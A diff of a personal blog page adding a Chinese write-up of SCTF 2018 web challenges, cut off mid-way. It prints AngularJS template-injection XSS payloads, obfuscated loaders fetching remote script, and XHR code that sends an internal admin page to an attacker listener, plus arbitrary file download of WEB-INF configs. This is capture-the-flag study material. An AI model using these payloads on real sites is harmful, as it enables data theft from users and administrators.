@@ -181,7 +181,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Accueil
           </a>
         </li>
       
@@ -191,7 +191,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -214,6 +214,325 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/22/暑期目标/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ratten3anger">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ratten3anger">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/22/暑期目标/" itemprop="url">暑期目标</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-22T11:00:04+08:00">
+                2018-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/21/SCTF write up(部分)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ratten3anger">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ratten3anger">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/21/SCTF write up(部分)/" itemprop="url">SCTF write up</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-21T11:01:30+08:00">
+                2018-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SCTF2018"><a href="#SCTF2018" class="headerlink" title="SCTF2018"></a>SCTF2018</h1><p>临近期末，和师傅们打比赛非常愉快，虽然web一败涂地(笑)。这次题目质量很高，学习到了许多新姿势。</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="新的建议版"><a href="#新的建议版" class="headerlink" title="新的建议版"></a>新的建议版</h2><p>考点：</p>
+<p>1.模板注入</p>
+<p>2.新型架构的认识</p>
+<p>3.存储型XSS的套路</p>
+<p>4.XSS读取页面内容</p>
+<hr>
+<p>进入题目，需要注册并登陆</p>
+<p>之后路由跳转到suggest留言框，基础xss无法成功</p>
+<p>发现静态资源存在一个测试JS，两个angular.js的route资源，使用了angular模板</p>
+<p><img src="E:/ratten3anger.github.io/source/SCTF/web1_1.png" alt=""></p>
+<p>尝试模板注入:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=1&#125; &#125; &#125;;alert(/1/)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>模板注入学习连接:</p>
+<p>成功弹窗</p>
+<p>但是怎么XSS获得想要的信息呢 在这里卡住了</p>
+<p>访问页面那个test.js发现</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 应该将后台放到本地？</span></span><br><span class="line"><span class="comment">//angular.module("mintest",["ngRoute"]).controller("IndexController",function($scope,$route)&#123;$scope.$route=$route&#125;).config(function($routeProvider)&#123;$routeProvider.when("/admintest2313",&#123;templateUrl:"view/admintest2313.html",controller:"IndexController"&#125;).when("/home",&#123;templateUrl:"view/home.html",controller:"IndexController"&#125;).when("/login",&#123;templateUrl:"view/login.html",controller:"IndexController"&#125;).when("/loginout",&#123;templateUrl:"view/loginout.html",controller:"IndexController"&#125;).when("/register",&#123;templateUrl:"view/register.html",controller:"IndexController"&#125;).when("/suggest",&#123;templateUrl:"view/suggest.html",controller:"IndexController"&#125;)&#125;);</span></span><br></pre></td></tr></table></figure>
+<p>规定了页面的静态路由跳转(关于angular.js的路由跳转功能可以搜索菜鸟教程)</p>
+<p>angluar­route的作用是前端路由 尝试寻找前端路由的js文件</p>
+<p>有一个<code>view/admintest2313.html</code>地址 访问一下</p>
+<p>是一个后台测试界面，从源码读到一个api地址<code>api/memos/admintest2313</code></p>
+<p>发现一些可能存在信息熵的页面</p>
+<p>故推测需要获取的是<code>memo/+admin+</code>这个页面的地址</p>
+<p>这是一个考察存储型XSS的题目，故应该有后台人员或机器人在不停访问后台服务器（这个就是套路了）</p>
+<p>此外还可以看出前端服务器与后台的服务器是分离的，而且通过XSS在前端服务器读后台服务器的页面信息因为同源策略的问题必定不能得到。所以考虑通过机器人加载远程(本地主机JS)的XSS发包并监听本地端口实现页面信息的获取。</p>
+<p>整个架构：</p>
+<p><img src="E:/CTF/SCTF/web1网络拓扑图.png" alt=""></p>
+<p>在suggest提交的payload，绕过过滤，使用base64或js编码、转16进制等：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=1&#125; &#125; &#125;;var a=\u0064\u</span></span><br><span class="line"><span class="string">006f\u0063\u0075\u006d\u0065\u006e\u0074.createElement("\u0073\u0063\u007</span></span><br><span class="line"><span class="string">2\u0069\u0070\u0074");a.src="http://ip.com/xss";\u0064\u006f\u0063\u00</span></span><br><span class="line"><span class="string">75\u006d\u0065\u006e\u0074.body.appendChild(a)//'</span>);&#125;<span class="comment">//');&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>看到也有师傅使用的是jQuery的$.getScript 函数引用 js 文件 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.getScript(<span class="string">'http://xsspt.com/xxxx'</span>);</span><br><span class="line">编码之后</span><br><span class="line"><span class="built_in">eval</span>(atob(<span class="string">'JC5nZXRTY3JpcHQoJ2h0dHA6Ly94c3NwdC5jb20veHh4eCcpOw=='</span>));</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">'x=1&#125; &#125; &#125;;eval(atob(\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly94c3NwdC5jb20veHh4eCcpOw==\'));&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>得到了机器人发的包 发现后台服务器地址为127.0.0.1:1002 不在公网上</p>
+<p>通过机器人访问后台地址<code>http://127.0.0.1:1002/admin/suggest</code></p>
+<p>读admin/file页面：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:1002/admin/file"</span>, <span class="literal">true</span>);</span><br><span class="line">x.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">text = x.responseText;</span><br><span class="line">newdata = <span class="built_in">JSON</span>.stringify(&#123;<span class="string">'token'</span>:text&#125;);</span><br><span class="line">y = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">y.open(<span class="string">"POST"</span>, <span class="string">"http://yourip:2333"</span>, <span class="literal">true</span>);</span><br><span class="line">y.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">y.send(newdata);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">x.send(<span class="string">""</span>)*<span class="regexp">/</span></span><br></pre></td></tr></table></figure>
+<p>监听2333端口</p>
+<p><img src="E:\ratten3anger.github.io\source\SCTF\web1_2.png" alt="web1_2"></p>
+<p><img src="E:\ratten3anger.github.io\source\SCTF\web1_3.png" alt="web1_3"></p>
+<p>前端XSS传到后台，加载远程JS，post发包请求admin/file 拿到flag:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">"POST"</span>, <span class="string">"http://127.0.0.1:1002/admin/file"</span>, <span class="literal">true</span>);</span><br><span class="line">x.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">x.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">text = x.responseText;</span><br><span class="line">newdata = <span class="built_in">JSON</span>.stringify(&#123;<span class="string">'token'</span>:text&#125;);</span><br><span class="line">y = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">y.open(<span class="string">"POST"</span>, <span class="string">"http://yourip"</span>, <span class="literal">true</span>);</span><br><span class="line">y.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">y.send(newdata);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">x.send(<span class="string">"filepasswd=HGf^%2639NsslUIf^23"</span>);*<span class="regexp">/</span></span><br></pre></td></tr></table></figure>
+<p><img src="E:\ratten3anger.github.io\source\SCTF\web1_4.png" alt="web1_4"></p>
+<p>关于模板注入和XSS获取页面的方法之后再写博文详细讨论</p>
+<p><a href="http://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">关于模板注入的page请戳这里</a></p>
+<h2 id="zhuanxv"><a href="#zhuanxv" class="headerlink" title="zhuanxv"></a>zhuanxv</h2><p>考点：</p>
+<p>1.任意文件下载</p>
+<p>2.JAVA-Web框架结构</p>
+<p>3.HQL注入</p>
+<p>这个题么emmmm，进入的页面端口号应该是随便开的，映射到的页面也没什么信息。所以扫一下端口，所以扫一下目录，所以扫一下文件</p>
+<p>端口：22、80打开 对应ssh和apache服务</p>
+<p>目录，文件：发现一个登陆页面(zhuanxv.html)，一个list页面</p>
+<p>因为扫描是可以的，所以当时觉得这里应该可以爆破，所以询问了下运维师傅，师傅说可以爆破但是没有用处。emmmm观察页面源码发现内联css里面有一个任意文件下载。且服务又是使用SSH(Struts+Spring+Hibernate)框架写的，所以和之前DDCTF的思路有十分相似之处。</p>
+<p>把兔子师傅博客的那道DDCTF专属链接看一下，发现java-web都是将重要的管理结构信息存放到WEB-INF目录下以xml文件形式保存</p>
+<p>所以我们可以先通过下载这些xml来获取想要的信息</p>
+<p>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">"WebApp_9"</span> <span class="attr">version</span>=<span class="string">"2.4"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Struts Blank<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/ctfpage/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/ctfpage/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>applicationContent.xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://localhost:3306/sctf<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.springframework.orm.hibernate3.LocalSessionFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappingLocations"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>user.hbm.xml<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernateProperties"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"hibernate.show_sql"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"hibernateTemplate"</span> <span class="attr">class</span>=<span class="string">"org.springframework.orm.hibernate3.HibernateTemplate"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sessionFactory"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"sessionFactory"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.orm.hibernate3.HibernateTransactionManager"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sessionFactory"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"sessionFactory"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"service"</span> <span class="attr">class</span>=<span class="string">"org.springframework.transaction.interceptor.TransactionProxyFactoryBean"</span> <span class="attr">abstract</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"transactionManager"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"transactionManager"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"transactionAttributes"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"add"</span>&gt;</span>PROPAGATION_REQUIRED<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"find*"</span>&gt;</span>PROPAGATION_REQUIRED,readOnly<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDAO"</span> <span class="attr">class</span>=<span class="string">"com.cuitctf.dao.impl.UserDaoImpl"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernateTemplate"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"hibernateTemplate"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userService"</span> <span class="attr">class</span>=<span class="string">"com.cuitctf.service.impl.UserServiceImpl"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"userDao"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"userDAO"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现user.hbm.xml</p>
+<p>读一下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE hibernate-mapping PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-mapping</span> <span class="attr">package</span>=<span class="string">"com.cuitctf.po"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span> <span class="attr">name</span>=<span class="string">"User"</span> <span class="attr">table</span>=<span class="string">"hlj_members"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"user_id"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">generator</span> <span class="attr">class</span>=<span class="string">"identity"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span> <span class="attr">name</span>=<span class="string">"Flag"</span> <span class="attr">table</span>=<span class="string">"bc3fa8be0db46a3610db3ca0ec794c0b"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">column</span>=<span class="string">"welcometoourctf"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">generator</span> <span class="attr">class</span>=<span class="string">"identity"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"flag"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现提示类名为那一串md5，子类为一串字符串(没有发现也没有问题，可以通过盲注得出)</p>
+<p>还可以知道DAO层和Service层有class文件 下载下来并进行反编译：</p>
